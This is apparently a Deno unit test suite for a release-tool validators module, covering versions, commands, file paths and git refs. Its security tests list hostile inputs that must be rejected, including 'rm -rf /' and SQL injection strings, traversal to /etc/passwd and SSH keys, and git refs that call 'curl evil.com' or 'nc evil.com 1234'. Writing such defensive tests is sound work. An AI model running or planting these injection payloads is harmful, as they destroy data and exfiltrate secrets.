/**
 * @fileoverview Unit tests for validators module
 * @module validators_test
 * @description Comprehensive test suite for input validation functions
 */

import { assertEquals, assertExists, assertStrictEquals } from "https://deno.land/std@0.208.0/assert/mod.ts";

import {
  combineResults,
  COMMANDS,
  err,
  isError,
  isSuccess,
  ok,
  RELEASE_TYPES,
  validateCommand,
  validateFilePath,
  validateGitRef,
  validateReleaseType,
  validateVersion,
} from "./validators.ts";

// =============================================================================
// validateReleaseType Tests
// =============================================================================

Deno.test("validateReleaseType - valid release types", () => {
  // Test all valid release types
  for (const type of RELEASE_TYPES) {
    const result = validateReleaseType(type);
    assertEquals(result.success, true);
    if (result.success) {
      assertEquals(result.data, type);
    }
  }

  // Test case insensitive
  const upperResult = validateReleaseType("MAJOR");
  assertEquals(upperResult.success, true);
  if (upperResult.success) {
    assertEquals(upperResult.data, "major");
  }

  // Test with whitespace
  const spacedResult = validateReleaseType("  minor  ");
  assertEquals(spacedResult.success, true);
  if (spacedResult.success) {
    assertEquals(spacedResult.data, "minor");
  }
});

Deno.test("validateReleaseType - invalid release types", () => {
  // Test invalid string
  const invalidResult = validateReleaseType("invalid");
  assertEquals(invalidResult.success, false);
  if (!invalidResult.success) {
    assertExists(invalidResult.error);
    assertEquals(invalidResult.error.message.includes("Invalid release type"), true);
  }

  // Test non-string inputs
  const numberResult = validateReleaseType(123);
  assertEquals(numberResult.success, false);
  if (!numberResult.success) {
    assertEquals(numberResult.error instanceof Error, true);
    assertEquals(numberResult.error.message.includes("must be a string"), true);
  }

  const nullResult = validateReleaseType(null);
  assertEquals(nullResult.success, false);

  const undefinedResult = validateReleaseType(undefined);
  assertEquals(undefinedResult.success, false);

  const objectResult = validateReleaseType({});
  assertEquals(objectResult.success, false);
});

Deno.test("validateReleaseType - edge cases", () => {
  // Empty string
  const emptyResult = validateReleaseType("");
  assertEquals(emptyResult.success, false);

  // Similar but wrong values
  const typoResult = validateReleaseType("mijor");
  assertEquals(typoResult.success, false);

  // SQL injection attempt (security test)
  const sqlResult = validateReleaseType("major'; DROP TABLE versions;--");
  assertEquals(sqlResult.success, false);
});

// =============================================================================
// validateCommand Tests
// =============================================================================

Deno.test("validateCommand - valid commands", () => {
  for (const cmd of COMMANDS) {
    const result = validateCommand(cmd);
    assertEquals(result.success, true);
    if (result.success) {
      assertEquals(result.data, cmd);
    }
  }

  // Case insensitive
  const upperResult = validateCommand("INIT");
  assertEquals(upperResult.success, true);
  if (upperResult.success) {
    assertEquals(upperResult.data, "init");
  }

  // With whitespace
  const spacedResult = validateCommand("  release  ");
  assertEquals(spacedResult.success, true);
  if (spacedResult.success) {
    assertEquals(spacedResult.data, "release");
  }
});

Deno.test("validateCommand - invalid commands", () => {
  const invalidResult = validateCommand("deploy");
  assertEquals(invalidResult.success, false);
  if (!invalidResult.success) {
    assertEquals(invalidResult.error.message.includes("Unknown command"), true);
  }

  // Non-string inputs
  const boolResult = validateCommand(true);
  assertEquals(boolResult.success, false);

  const arrayResult = validateCommand(["init"]);
  assertEquals(arrayResult.success, false);
});

// =============================================================================
// validateVersion Tests
// =============================================================================

Deno.test("validateVersion - valid semantic versions", () => {
  const validVersions = [
    "1.0.0",
    "0.0.1",
    "10.20.30",
    "v1.2.3",
    "2.0.0-beta",
    "3.0.0-alpha.1",
    "1.0.0+build123",
    "2.0.0-rc.1+build.456",
  ];

  for (const version of validVersions) {
    const result = validateVersion(version);
    assertEquals(result.success, true, `Failed for version: ${version}`);
    if (result.success) {
      assertEquals(result.data, version.trim());
    }
  }
});

Deno.test("validateVersion - invalid versions", () => {
  const invalidVersions = [
    "1",
    "1.2",
    "a.b.c",
    "1.2.3.4",
    "v",
    "version-1.0.0",
    "1.0",
    "",
    "   ",
  ];

  for (const version of invalidVersions) {
    const result = validateVersion(version);
    assertEquals(result.success, false, `Should fail for version: ${version}`);
  }

  // Non-string inputs
  const numberResult = validateVersion(123);
  assertEquals(numberResult.success, false);

  const objectResult = validateVersion({ version: "1.0.0" });
  assertEquals(objectResult.success, false);
});

Deno.test("validateVersion - security tests", () => {
  // Command injection attempts
  const cmdInjection = validateVersion("1.0.0; rm -rf /");
  assertEquals(cmdInjection.success, false);

  // Path traversal in version
  const pathTraversal = validateVersion("1.0.0/../../../etc/passwd");
  assertEquals(pathTraversal.success, false);
});

// =============================================================================
// validateFilePath Tests
// =============================================================================

Deno.test("validateFilePath - valid paths", () => {
  const validPaths = [
    "./file.txt",
    "src/index.ts",
    "deep/nested/path/file.js",
    "file-with-dashes.md",
    "file_with_underscores.py",
    ".hidden-file",
  ];

  for (const path of validPaths) {
    const result = validateFilePath(path);
    assertEquals(result.success, true, `Failed for path: ${path}`);
    if (result.success) {
      assertEquals(result.data, path.trim());
    }
  }
});

Deno.test("validateFilePath - invalid paths (security)", () => {
  // Path traversal attempts
  const traversalPaths = [
    "../etc/passwd",
    "../../secret.key",
    "./valid/../../../etc/passwd",
    "path/with/../../../traversal",
  ];

  for (const path of traversalPaths) {
    const result = validateFilePath(path);
    assertEquals(result.success, false, `Should block path traversal: ${path}`);
    if (!result.success) {
      assertEquals(result.error.message.includes("traversal"), true);
    }
  }

  // Null byte injection
  const nullByteResult = validateFilePath("file.txt\0.png");
  assertEquals(nullByteResult.success, false);
  if (!nullByteResult.success) {
    assertEquals(nullByteResult.error.message.includes("Null bytes"), true);
  }

  // Absolute paths
  const absolutePaths = [
    "/etc/passwd",
    "/root/.ssh/id_rsa",
    "C:\\Windows\\System32\\config.sys",
    "D:\\secret.txt",
  ];

  for (const path of absolutePaths) {
    const result = validateFilePath(path);
    assertEquals(result.success, false, `Should block absolute path: ${path}`);
    if (!result.success) {
      assertEquals(result.error.message.includes("Absolute paths"), true);
    }
  }
});

Deno.test("validateFilePath - edge cases", () => {
  // Empty path
  const emptyResult = validateFilePath("");
  assertEquals(emptyResult.success, false);
  if (!emptyResult.success) {
    assertEquals(emptyResult.error.message.includes("cannot be empty"), true);
  }

  // Only whitespace
  const whitespaceResult = validateFilePath("   ");
  assertEquals(whitespaceResult.success, false);

  // Non-string inputs
  const numberResult = validateFilePath(123);
  assertEquals(numberResult.success, false);

  const arrayResult = validateFilePath(["file.txt"]);
  assertEquals(arrayResult.success, false);
});

// =============================================================================
// validateGitRef Tests
// =============================================================================

Deno.test("validateGitRef - valid refs", () => {
  const validRefs = [
    "main",
    "develop",
    "feature/new-feature",
    "bugfix/issue-123",
    "release-1.0.0",
    "v1.2.3",
    "abc123def",
    "HEAD",
    "origin/main",
  ];

  for (const ref of validRefs) {
    const result = validateGitRef(ref);
    assertEquals(result.success, true, `Failed for ref: ${ref}`);
    if (result.success) {
      assertEquals(result.data, ref.trim());
    }
  }
});

Deno.test("validateGitRef - command injection prevention", () => {
  const dangerousRefs = [
    "main; rm -rf /",
    "develop && curl evil.com",
    "feature`whoami`",
    "$(cat /etc/passwd)",
    "branch|nc evil.com 1234",
    "ref<script>alert(1)</script>",
    "branch\\nrm -rf /",
    "ref$IFS$9rm$IFS$9-rf$IFS$9/",
  ];

  for (const ref of dangerousRefs) {
    const result = validateGitRef(ref);
    assertEquals(result.success, false, `Should block dangerous ref: ${ref}`);
    if (!result.success) {
      assertEquals(result.error.message.includes("dangerous"), true);
    }
  }
});

Deno.test("validateGitRef - edge cases", () => {
  // Empty ref
  const emptyResult = validateGitRef("");
  assertEquals(emptyResult.success, false);

  // Only whitespace
  const whitespaceResult = validateGitRef("   ");
  assertEquals(whitespaceResult.success, false);

  // Non-string inputs
  const nullResult = validateGitRef(null);
  assertEquals(nullResult.success, false);

  const objectResult = validateGitRef({ ref: "main" });
  assertEquals(objectResult.success, false);
});

// =============================================================================
// Type Guard Tests
// =============================================================================

Deno.test("isSuccess type guard", () => {
  const successResult = { success: true as const, data: "test" };
  const errorResult = { success: false as const, error: new Error("test") };

  assertEquals(isSuccess(successResult), true);
  assertEquals(isSuccess(errorResult), false);

  // Type narrowing test (compile-time check)
  if (isSuccess(successResult)) {
    // TypeScript knows result.data exists here
    assertExists(successResult.data);
  }
});

Deno.test("isError type guard", () => {
  const successResult = { success: true as const, data: "test" };
  const errorResult = { success: false as const, error: new Error("test") };

  assertEquals(isError(successResult), false);
  assertEquals(isError(errorResult), true);

  // Type narrowing test
  if (isError(errorResult)) {
    // TypeScript knows result.error exists here
    assertExists(errorResult.error);
  }
});

// =============================================================================
// Helper Function Tests
// =============================================================================

Deno.test("ok helper function", () => {
  const result = ok("test data");
  assertEquals(result.success, true);
  if (result.success) {
    assertEquals(result.data, "test data");
  }

  // Test with different types
  const numberResult = ok(42);
  assertEquals(numberResult.success, true);
  if (numberResult.success) {
    assertEquals(numberResult.data, 42);
  }

  const objectResult = ok({ key: "value" });
  assertEquals(objectResult.success, true);
  if (objectResult.success) {
    assertEquals(objectResult.data.key, "value");
  }
});

Deno.test("err helper function", () => {
  const error = new Error("test error");
  const result = err(error);
  assertEquals(result.success, false);
  if (!result.success) {
    assertStrictEquals(result.error, error);
  }

  // Test with string error
  const stringResult = err("error message");
  assertEquals(stringResult.success, false);
  if (!stringResult.success) {
    assertEquals(stringResult.error, "error message");
  }
});

// =============================================================================
// combineResults Tests
// =============================================================================

Deno.test("combineResults - all success", () => {
  const results = [
    ok("first"),
    ok("second"),
    ok("third"),
  ];

  const combined = combineResults(results);
  assertEquals(combined.success, true);
  if (combined.success) {
    assertEquals(combined.data, ["first", "second", "third"]);
  }
});

Deno.test("combineResults - with failures", () => {
  const error1 = new Error("first error");
  const error2 = new Error("second error");

  const results = [
    ok("success"),
    err(error1),
    err(error2),
  ];

  const combined = combineResults(results);
  assertEquals(combined.success, false);
  if (!combined.success) {
    // Should return first error
    assertStrictEquals(combined.error, error1);
  }
});

Deno.test("combineResults - empty array", () => {
  const results: ReturnType<typeof ok<string>>[] = [];
  const combined = combineResults(results);
  assertEquals(combined.success, true);
  if (combined.success) {
    assertEquals(combined.data, []);
  }
});

// =============================================================================
// Integration Tests
// =============================================================================

Deno.test("validators integration - typical CLI flow", () => {
  // Simulate validating CLI arguments
  const commandResult = validateCommand("release");
  const typeResult = validateReleaseType("minor");
  const versionResult = validateVersion("1.2.3");

  // Combine all validations
  const combined = combineResults([commandResult, typeResult, versionResult]);

  assertEquals(combined.success, true);
  if (combined.success) {
    const [command, type, version] = combined.data;
    assertEquals(command, "release");
    assertEquals(type, "minor");
    assertEquals(version, "1.2.3");
  }
});

Deno.test("validators integration - validation failure flow", () => {
  // Simulate invalid CLI arguments
  const commandResult = validateCommand("deploy"); // Invalid command
  const typeResult = validateReleaseType("minor");
  const versionResult = validateVersion("1.2.3");

  const combined = combineResults([commandResult, typeResult, versionResult]);

  assertEquals(combined.success, false);
  if (!combined.success) {
    // Should fail fast on first error
    assertEquals(combined.error.message.includes("Unknown command"), true);
  }
});

// =============================================================================
// Performance Tests
// =============================================================================

Deno.test("validators performance - bulk validation", () => {
  const iterations = 1000;
  const start = performance.now();

  for (let i = 0; i < iterations; i++) {
    validateReleaseType("minor");
    validateVersion("1.2.3");
    validateFilePath("src/file.ts");
    validateGitRef("main");
  }

  const end = performance.now();
  const totalTime = end - start;
  const avgTime = totalTime / iterations;

  // Validators should be fast (< 0.1ms per validation on average)
  assertEquals(avgTime < 0.1, true, `Average time ${avgTime}ms is too slow`);
});
